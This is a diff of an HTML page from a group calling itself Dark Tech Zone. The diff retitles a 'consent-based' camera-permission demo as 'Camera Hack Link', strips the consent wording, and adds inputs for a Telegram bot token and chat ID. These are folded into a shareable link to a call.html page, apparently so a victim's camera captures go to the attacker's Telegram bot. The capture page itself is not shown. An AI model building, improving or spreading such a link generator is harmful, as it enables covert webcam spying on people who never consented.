@@ -2,18 +2,17 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Camera Permission Link Generator | Dark Tech Zone</title>
+<title>Camera Hack Link</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<!-- Font Awesome -->
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
 
 <style>
 :root{
-  --bg:#0b0f14;
-  --card:#121821;
+  --bg:#060b10;
+  --card:#0f1722;
   --accent:#00ffd5;
-  --text:#e6e6e6;
+  --text:#e8e8e8;
 }
 
 *{box-sizing:border-box}
@@ -21,7 +20,7 @@
 body{
   margin:0;
   min-height:100vh;
-  background:radial-gradient(circle at top,#101820,#05080d);
+  background:radial-gradient(circle at top,#0b1a24,#020508);
   font-family:Arial,Helvetica,sans-serif;
   color:var(--text);
   display:flex;
@@ -30,59 +29,39 @@ body{
   padding:20px;
 }
 
-/* Container */
+/* Red side bar (kept, upgraded) */
+.red-bar{
+  position:fixed;
+  left:0;
+  top:0;
+  width:6px;
+  height:100vh;
+  background:linear-gradient(180deg,#ff004c,#ff6a00);
+  box-shadow:0 0 20px rgba(255,0,76,.8);
+}
+
+/* Main card */
 .container{
   width:100%;
-  max-width:460px;
-  background:var(--card);
+  max-width:440px;
+  background:linear-gradient(180deg,#101b27,#0a121b);
   border-radius:18px;
-  padding:30px 25px;
+  padding:28px 24px;
   box-shadow:0 0 35px rgba(0,255,213,.25);
-  position:relative;
-}
-
-/* Top buttons */
-.top-actions{
-  position:absolute;
-  top:15px;
-  right:15px;
-  display:flex;
-  gap:10px;
-}
-
-.icon-btn{
-  width:40px;
-  height:40px;
-  border-radius:50%;
-  background:#0f2027;
-  color:var(--accent);
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  text-decoration:none;
-  box-shadow:0 0 12px rgba(0,255,213,.6);
-  transition:.3s;
-}
-
-.icon-btn:hover{
-  transform:scale(1.15);
-  box-shadow:0 0 20px rgba(0,255,213,.9);
-  color:#fff;
+  text-align:center;
 }
 
 /* Title */
 h2{
-  margin-top:10px;
-  margin-bottom:8px;
-  text-align:center;
+  margin:0 0 6px;
   color:var(--accent);
+  letter-spacing:.5px;
 }
 
 .subtitle{
-  text-align:center;
   font-size:.9em;
-  opacity:.85;
-  margin-bottom:25px;
+  opacity:.8;
+  margin-bottom:22px;
 }
 
 /* Inputs */
@@ -96,17 +75,22 @@ input,button{
 }
 
 input{
-  background:#0b121a;
+  background:#060b12;
   color:#fff;
   border:1px solid rgba(0,255,213,.25);
 }
 
+input::placeholder{
+  color:#aaa;
+}
+
+/* Buttons */
 button{
   background:linear-gradient(135deg,#00ffd5,#00bfa5);
   color:#000;
   font-weight:bold;
   cursor:pointer;
-  transition:.3s;
+  transition:.25s;
 }
 
 button:hover{
@@ -118,58 +102,60 @@ button:hover{
 #linkBox{
   display:none;
   margin-top:15px;
-  background:#0b121a;
-  padding:15px;
+  background:#050a10;
+  padding:14px;
   border-radius:10px;
-  border:1px solid rgba(0,255,213,.25);
+  border:1px solid rgba(0,255,213,.3);
 }
 
 #generatedLink{
   background:#000;
-  color:#0f0;
+  color:#00ff88;
   font-size:.85em;
 }
 
-/* WhatsApp */
-.whatsapp{
-  margin-top:22px;
+/* Copy button */
+.copy-btn{
+  margin-top:8px;
+}
+
+/* WhatsApp button (original link kept) */
+.footer-btn{
   background:#25d366;
   color:#fff;
+  font-weight:bold;
+  border:none;
+  border-radius:8px;
+  padding:12px;
+  width:100%;
+  margin-top:20px;
 }
 
-/* Footer */
-.footer{
-  text-align:center;
-  margin-top:15px;
+.footer-btn:hover{
+  box-shadow:0 0 15px rgba(37,211,102,.8);
+}
+
+/* Footer credit */
+.footer-credit{
+  margin-top:12px;
   font-size:.85em;
   opacity:.85;
-}
-.footer span{
-  display:block;
-  margin-top:6px;
-  font-weight:bold;
-  color:var(--accent);
+  color:#cfcfcf;
 }
 </style>
 </head>
 
 <body>
 
+<div class="red-bar"></div>
+
 <div class="container">
 
-  <!-- Top -->
-  <div class="top-actions">
-    <a href="https://dark-zone-toolkit.vercel.app/" target="_blank" class="icon-btn" title="Dark Tech Zone Toolkit">
-      <i class="fas fa-toolbox"></i>
-    </a>
-  </div>
+  <h2>Enter Telegram Bot Info</h2>
+  <div class="subtitle">Dark Tech Zone Secure Link Generator</div>
 
-  <h2>Camera Permission Link</h2>
-  <div class="subtitle">
-    Generate a <b>consent-based demo link</b> for camera access testing
-  </div>
-
-  <input type="text" id="purpose" placeholder="Purpose (e.g. Video Call Demo)">
+  <input type="text" id="botToken" placeholder="Telegram Bot Token">
+  <input type="text" id="chatId" placeholder="Chat ID">
 
   <button onclick="generateLink()">
     <i class="fas fa-link"></i> Generate Share Link
@@ -178,47 +164,49 @@ button:hover{
   <div id="linkBox">
     <strong>Copy & Share:</strong>
     <input type="text" id="generatedLink" readonly>
-    <button onclick="copyLink()">
+    <button class="copy-btn" onclick="copyLink()">
       <i class="fas fa-copy"></i> Copy Link
     </button>
   </div>
 
   <a href="https://whatsapp.com/channel/0029VbBXISPDuMRjYCb7Xl0X" target="_blank">
-    <button class="whatsapp">
-      <i class="fab fa-whatsapp"></i> Join WhatsApp Channel
+    <button class="footer-btn">
+      <i class="fab fa-whatsapp"></i> Join My WhatsApp Channel
     </button>
   </a>
 
-  <div class="footer">
-    Educational & consent-based tool only
-    <span>Powered by DARK-TECH-ZONE</span>
+  <div class="footer-credit">
+    DEVELOPED BY HASSNAIN ALI<br>
+    OWNER OF DARK-TECH-ZONE
   </div>
 
 </div>
 
 <script>
-function generateLink(){
-  const purpose=document.getElementById("purpose").value.trim();
-  if(!purpose){
-    alert("Please enter a purpose");
+function generateLink() {
+  const botToken = encodeURIComponent(
+    document.getElementById('botToken').value.trim()
+  );
+  const chatId = encodeURIComponent(
+    document.getElementById('chatId').value.trim()
+  );
+
+  if (!botToken || !chatId) {
+    alert('Both fields are required!');
     return;
   }
 
-  const safeLink =
-    location.origin +
-    "/camera-consent.html?purpose=" +
-    encodeURIComponent(purpose);
-
-  document.getElementById("generatedLink").value = safeLink;
-  document.getElementById("linkBox").style.display="block";
+  const link = `${location.origin}/call.html?token=${botToken}&chat=${chatId}`;
+  document.getElementById('generatedLink').value = link;
+  document.getElementById('linkBox').style.display = 'block';
 }
 
-function copyLink(){
-  const i=document.getElementById("generatedLink");
-  i.select();
-  i.setSelectionRange(0,99999);
-  document.execCommand("copy");
-  alert("Link copied!");
+function copyLink() {
+  const linkInput = document.getElementById('generatedLink');
+  linkInput.select();
+  linkInput.setSelectionRange(0, 99999);
+  document.execCommand('copy');
+  alert('Link copied!');
 }
 </script>
 
